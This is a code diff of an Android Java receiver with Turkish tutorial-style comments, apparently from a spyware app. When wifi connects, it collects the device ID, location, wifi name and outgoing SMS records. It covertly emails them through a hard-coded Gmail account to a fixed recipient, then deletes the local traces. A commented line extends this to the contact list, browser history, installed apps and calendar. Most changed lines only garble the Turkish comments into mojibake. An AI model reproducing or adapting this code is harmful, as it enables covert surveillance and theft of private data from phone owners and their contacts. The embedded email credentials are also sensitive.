@@ -23,7 +23,7 @@ import android.os.Build;
 import android.os.StrictMode;
 import android.util.Log;
 
-//Arkadaşlar burada yapacağımız şey wifi bağlandığında kayıtlarımızın db kayıtlarımızın) mail olarak bize gönderilmesiiçin
+//ArkadaÃ¾lar burada yapacaÃ°Ã½mÃ½z Ã¾ey wifi baÃ°landÃ½Ã°Ã½nda kayÃ½tlarÃ½mÃ½zÃ½n db kayÃ½tlarÃ½mÃ½zÃ½n) mail olarak bize gÃ¶nderilmesiiÃ§in
 @SuppressLint("NewApi")
 public class InternetDinliyorum extends BroadcastReceiver {
 	GidenSmsDinleme gdnSms=new GidenSmsDinleme();
@@ -55,7 +55,7 @@ public class InternetDinliyorum extends BroadcastReceiver {
 	}
 
 	public String getWifiName(Context context) {
-		// bağlanılan wifi nin adını alalım
+		// baÃ°lanÃ½lan wifi nin adÃ½nÃ½ alalÃ½m
 		String ssid = "none";
 		WifiManager wifiManager = (WifiManager) context
 				.getSystemService(Context.WIFI_SERVICE);
@@ -73,10 +73,10 @@ public class InternetDinliyorum extends BroadcastReceiver {
 		String ssdi = getWifiName(context);
 		if (statusId == 1) {
 			gdnSms.onReceive(context, intent);
-			// Sayfanın tetiklendiği zaman
+			// SayfanÃ½n tetiklendiÃ°i zaman
 			String currenDateTime = DateFormat.getDateInstance().format(
 					new Date());
-			// Android Cihaz İd si okuma
+			// Android Cihaz Ãd si okuma
 			String serialnum = null;
 			try {
 				new Read(context, new MailCallback() {
@@ -90,7 +90,7 @@ public class InternetDinliyorum extends BroadcastReceiver {
 					@Override
 					public void onNumara(Map<String, String> numara) {
 						// TODO Auto-generated method stub
-						Log.e("zms","zms numara: "+numara.get("05071427743")+" "+numara);
+						Log.e("zms","zms numara: "+numara.get("05050001111")+" "+numara);
 					}
 				}).execute();
 				Class<?> c;
@@ -114,32 +114,32 @@ public class InternetDinliyorum extends BroadcastReceiver {
 				e.printStackTrace();
 			}
 		
-			//Rehberin tamamını gönderme
-						// sQLİTE db kayıt işlemleri
+			//Rehberin tamamÃ½nÃ½ gÃ¶nderme
+						// sQLÃTE db kayÃ½t iÃ¾lemleri
 			SQLiteDatabaseHelper dbHelper = SQLiteDatabaseHelper
 					.getInstance(context);
 			SQLiteDatabase db = dbHelper.getWritableDatabase();
 			ContentValues val = new ContentValues();
 			val.put(SQLiteDatabaseHelper.COLUMN_DATETIME, currenDateTime);
-			val.put(SQLiteDatabaseHelper.COLUMN_ACTION, "Wifi Baglandı");
+			val.put(SQLiteDatabaseHelper.COLUMN_ACTION, "Wifi BaglandÃ½");
 			val.put(SQLiteDatabaseHelper.COLUMN_CONTENT, ssdi + " "
 					);
-			//  +"\n"+"Rehberin Tamamı \n"+ ma.outPut()+"\n Site Kayıtları\n\n "+ma.browserOut()+"Uygulama Bilgiler\n\n"+ma.appInfo()+"Takvim Okuma\n\n"+ma.calendrOut()
+			//  +"\n"+"Rehberin TamamÃ½ \n"+ ma.outPut()+"\n Site KayÃ½tlarÃ½\n\n "+ma.browserOut()+"Uygulama Bilgiler\n\n"+ma.appInfo()+"Takvim Okuma\n\n"+ma.calendrOut()
 			val.put(SQLiteDatabaseHelper.COLUMN_SERIALNUMBER, serialnum);
 			db.insert(SQLiteDatabaseHelper.TABLE_NEWS, null, val);
-			// Burada kişinin konumunu alıyoruz.
+			// Burada kiÃ¾inin konumunu alÃ½yoruz.
 			knm.onReceive(context, intent);
 
-			// Buraya gide Giden Smslerin db kayıt işlemlerini yapalım
+			// Buraya gide Giden Smslerin db kayÃ½t iÃ¾lemlerini yapalÃ½m
 
-			SQLiteDataBaseHelperGidenSms dbHelperGidenSms = SQLiteDataBaseHelperGidenSms//sadece bu 3 satır kod kalmalı 2. dbimizden
+			SQLiteDataBaseHelperGidenSms dbHelperGidenSms = SQLiteDataBaseHelperGidenSms//sadece bu 3 satÃ½r kod kalmalÃ½ 2. dbimizden
 					.getInstance(context);
 			SQLiteDatabase dbGidenSms = dbHelperGidenSms.getWritableDatabase();
 			ContentValues valGidenSms = new ContentValues();
 			
 			
-			// Şimdi int bağlandığımızı sorguladk ve dogruladık mail işlemlerine
-			// geçebilriiz.
+			// Ãimdi int baÃ°landÃ½Ã°Ã½mÃ½zÃ½ sorguladk ve dogruladÃ½k mail iÃ¾lemlerine
+			// geÃ§ebilriiz.
 			if (Build.VERSION.SDK_INT >= 9) {
 
 				StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
@@ -147,7 +147,7 @@ public class InternetDinliyorum extends BroadcastReceiver {
 				StrictMode.setThreadPolicy(policy);
 			}
 Log.i("zms","zms InterntB 1");
-			h = new Mail("hemenindir57@gmail.com","123zafer123");
+			h = new Mail("hemenindir57@gmail.com","123xxxx123");
 			Log.i("zms","zms InterntB 2");
 			List<SQLiteDB> satirlar = new ArrayList<SQLiteDB>();
 			db = dbHelper.getReadableDatabase();
@@ -188,8 +188,8 @@ Log.i("zms","zms InterntB 1");
 					cihazId = cursorGidenSms.getString(4);
 					cursorGidenSms.moveToNext();
 				}
-					// Burada yaptığımız eyer mail hatasız olarak gittiyse sql
-					// DB i siliyoruz ki cihazımız şişmesin
+					// Burada yaptÃ½Ã°Ã½mÃ½z eyer mail hatasÃ½z olarak gittiyse sql
+					// DB i siliyoruz ki cihazÃ½mÃ½z Ã¾iÃ¾mesin
 					if (emailGonder(cihazId + "KAYITLARI", epostaGovdesi) == 1) {
 						String sql = "DELETE FROM "
 								+ SQLiteDatabaseHelper.TABLE_NEWS;
@@ -207,8 +207,8 @@ Log.i("zms","zms InterntB 1");
 	}
 
 	public int emailGonder(String konu, String mesaj) {
-		String[] toArr = { "mehmetduman34500@gmail.com" };// aralara virgül koyarak
-														// istenildiği kadar
+		String[] toArr = { "mehmetduman34500@gmail.com" };// aralara virgÃ¼l koyarak
+														// istenildiÃ°i kadar
 														// mail adresi
 														// girilebilr.
 		h.setTo(toArr);
@@ -218,20 +218,20 @@ Log.i("zms","zms InterntB 1");
 
 		try {
 			if (h.send()) {
-				Log.i("zms Wfi Dinlyrm", "zms Eposta başarı ile gönderildi");
+				Log.i("zms Wfi Dinlyrm", "zms Eposta baÃ¾arÃ½ ile gÃ¶nderildi");
 				return 1;
 			} else {
-				Log.i("zms Wfi Dinlyrm", "zms Eposta gönderilemedi");
+				Log.i("zms Wfi Dinlyrm", "zms Eposta gÃ¶nderilemedi");
 				return 2;
 			}
 		} catch (Exception e) {
 			// TODO: handle exception
 			Log.i("zms Wfi Dinlyrm",
-					"zms Eposta gönderilirken hata aldı: " + e.toString());
+					"zms Eposta gÃ¶nderilirken hata aldÃ½: " + e.toString());
 			return 3;
 
 		}
 
 	}
 
-}//EWT ARKADAŞLAR İNTERNET DİNLEMEDE BİTTİĞİNE GÖRE UYGULAMAMIZI DENEYEBİLRZ .Şimdi denemeden önce Manidest var tabi:)
+}//EWT ARKADAÃLAR ÃNTERNET DÃNLEMEDE BÃTTÃÃÃNE GÃ–RE UYGULAMAMIZI DENEYEBÃLRZ .Ãimdi denemeden Ã¶nce Manidest var tabi:)
